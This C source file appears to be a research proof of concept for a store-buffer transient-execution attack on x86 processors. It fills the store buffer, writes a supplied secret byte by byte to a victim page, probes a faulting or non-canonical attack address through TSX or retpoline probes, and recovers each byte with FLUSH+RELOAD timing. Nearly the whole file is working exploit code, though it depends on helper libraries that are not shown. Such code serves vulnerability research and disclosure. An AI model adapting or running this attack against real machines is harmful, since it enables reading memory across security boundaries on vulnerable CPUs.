#include <ctype.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <x86intrin.h>

#include <sys/mman.h>

#include <args.h>
#include <memkit.h>
#include <utils.h>

size_t secret_len;

int main(int argc, char *argv[])
{
	struct hit_count results[256];
	struct args args;
	unsigned char *leak;
	unsigned char *buffer;
	unsigned char *attack;
	unsigned char *victim;
	unsigned char *flush_sb;
	size_t i, k, round;
	size_t count;

	if (parse_args(&args, argc, argv) < 1) {
		fprintf(stderr, "usage: %s [<options>]\n", argv[0]);
		return -1;
	}

	secret_len = strlen(args.secret);

	/* Allocate the leak buffer. */
	leak = calloc(secret_len, sizeof *leak);

	if (!leak) {
		printf(" [-] unable to allocate the leak buffer\n");
		return -1;
	}

	printf(" [+] allocated the leak buffer\n");

	/* Set up memkit. */
	if (memkit_init() < 0) {
		printf(" [-] unable to set up memkit\n");
		goto err_free_leak;
	}

	printf(" [+] set up memkit\n");

	/* Set up the attack page. */
	if (args.leak_src == LEAK_NON_CANON) {
		attack = (void *)0x9876543214321000ull;
		printf(" [+] using %p as attack page\n", attack);
	} else {
		attack = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
			MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

		if (attack == MAP_FAILED) {
			printf(" [-] unable to allocate the attack page\n");
			goto err_memkit_exit;
		}

		printf(" [+] allocated the attack page\n");
		memset(attack, 0, 4096);

		/* Clear the access bit. This used to work with
		 * mprotect(PROT_NONE, ...) before the behaviour got changed to
		 * set the access bit in this case.
		 */
		clr_memory_ac(attack);
	}

	/* Allocate the victim page. */
	victim = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	if (victim == MAP_FAILED) {
		printf(" [-] unable to allocate the victim page\n");
		goto err_unmap_attack;
	}

	memset(victim, 0, 4096);
	printf(" [+] allocated the victim page\n");

	/* Allocate the buffer to flush the store buffer. */
	flush_sb = mmap(NULL, 56 * 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	if (flush_sb == MAP_FAILED) {
		printf(" [-] unable to allocate the buffer to flush the store buffer\n");
		goto err_unmap_victim;
	}

	memset(flush_sb, 0, 4096);
	printf(" [+] allocated the buffer to flush the store buffer\n");

	/* Allocate a buffer for FLUSH + RELOAD. */
	buffer = mmap(NULL, 256 * 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	if (buffer == MAP_FAILED) {
		printf(" [-] unable to allocate the FLUSH + RELOAD buffer\n");
		goto err_unmap_flush;
	}

	memset(buffer, 0, 256 * 4096);
	printf(" [+] allocated a buffer for FLUSH + RELOAD\n");

	for (i = 0; i < secret_len; ++i) {
		/* Reset the results. */
		clear_results(results);

		for (round = 0; round < 1000; ++round) {
			/* Flush the FLUSH + RELOAD buffer. */
			for (k = 0; k < 256; ++k) {
				_mm_clflush(buffer + ((k + round) % 256) * STRIDE);
			}

			_mm_mfence();

			/* Fill the store buffer with irrelevant stores. */
			for (k = 0; k < 56; ++k) {
				*(volatile unsigned char *)(flush_sb + k * 0x1000) = 0;
			}

			/* Perform a store to the victim page. */
			*(volatile unsigned char *)(victim + 0x30a + i) = *(args.secret + i);

			/* Try to leak from the store buffer. */
#ifdef TSX
			tsx_probe2(buffer, attack + 0x30a + i);
#else
			retpol_probe2(buffer, attack + 0x30a + i);
#endif

			/* Reconstruct the value by timing the FLUSH + RELOAD buffer. */
			time_buffer(results, buffer, 100);
		}

		/* Find the value that got the most hits. */
		match_best(leak + i, &count, results);
	}

	/* Display the result. */
	print_result(leak, secret_len, attack);

	/* Clean up. */
	munmap(buffer, 256 * 4096);
	munmap(flush_sb, 56 * 4096);
	munmap(victim, 4096);

	if (args.leak_src != LEAK_NON_CANON) {
		munmap(attack, 4096);
	}

	memkit_exit();
	free(leak);

	return 0;

err_unmap_flush:
	munmap(flush_sb, 56 * 4096);
err_unmap_victim:
	munmap(victim, 4096);
err_unmap_attack:
	if (args.leak_src != LEAK_NON_CANON) {
		munmap(attack, 4096);
	}
err_memkit_exit:
	memkit_exit();
err_free_leak:
	free(leak);
	return -1;
}

